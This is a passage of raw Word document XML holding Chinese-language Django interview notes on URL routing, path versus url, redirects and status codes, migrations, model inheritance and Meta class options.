          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>路由模块，然后从根路由出发，将</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所属的</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请求，全部转发到相应的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>urls.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>模块中。</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A1BD5BD"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04.Django2.x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>path</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>django1.x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>里面的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>有什么区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68E35D3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path</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>与</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是两个不同的模块</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效果都是响应返回页面</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, path</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>调用的是</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第三方模块或框架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而</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则是自定义的模块。</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默认支持正则表达式，而</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>path</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>不支持，正则表达式需要使用另外一个函数</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>re_path</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="757D0C7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django 2.x</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5953C4C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django.urls path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB13C9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django 1.x</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="136E6A7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django.conf.urls url</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="0DF60EA7"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05.Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>重定向的几种方法，用的什么状态码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="339CC67B" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="80"/>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HttpResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20771DCC" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="80"/>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Redirect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14BEEF08" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="80"/>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Reverse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE4CA2A" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="80"/>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状态码：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>302,301</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="132C994F" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="00024E97">
      <w:pPr>
        <w:widowControl/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="4" w:color="EEEEEE"/>
        </w:pBdr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="500" w:lineRule="exact"/>
        <w:contextualSpacing/>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模型层</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31021C7B"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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>命令</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t xml:space="preserve">migrate </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makemigrations</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>的差别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="390B57AD" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="81"/>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makemigrations:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>生成迁移文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="032F5C25" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="81"/>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migrate:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>执行迁移</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="4AEEB82E"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02.Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>Model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>的继承有几种形式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="431C9428" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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用父类</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>来保存在子类</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中重复的信息。父类</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>是不使用的也就是不生成单独的数据表，这种情况下使用抽象基类继承</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Abstract base classes</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A6C8C09" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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如从现有的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>继承并让每个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>都有自己的数据表，那么使用多重表继承</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Multi-table inheritance</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71451660" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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如只在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> model </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中修改</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Python </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>级的行为，而不涉及字段改变。</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代理</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> model (Proxy models) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>适用于这种场合</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="02784A4E"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03.class Meta</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>中的元信息字段有哪些</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BC73553" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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Model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>类可以通过元信息类设置索引和排序信息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0455AAB1" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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元信息是在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>类中定义一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Meta</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>子类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6582043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Meta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47E9A45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常用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6952E4C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db_table = 'table_name'  # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>自定义表名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C1F056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 xml:space="preserve">    index_together = ('tag1', 'tag2')  # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>联合索引</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D1EFDD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unique_together = ('tag3', 'tag4')  # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>联合唯一索引</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68FDB8A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verbose_name = 'table_name'  # /admin/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中显示的表名称</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68A2202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verbose_name_plural = verbose_name </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EB7920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ordering = 'ordering_tag'  # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>排序字段</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>这个选项是指定，模型的复数形式是什么</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="536A73B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abstract =True  # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>抽象基类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E6AE9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非常用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DC3BE2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app_label</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>这个选项只在一种情况下使用，就是你的模型类不在默认的应用程序包下的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>models.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>文件中，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0962B0F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这时候你需要指定你这个模型类是那个应用程序的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A2BC2A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比如你在其他地方写了一个模型类，而这个模型类是属于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>myapp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD67E9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app_label='myapp'  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EC35A7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db_table </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>是用于指定自定义数据库表名的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="477291E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db_table='my_owner_table' </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1154ECE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有些数据库有数据库表空间，比如</w:t>
      </w:r>
      <w:r>
        <w:rPr>
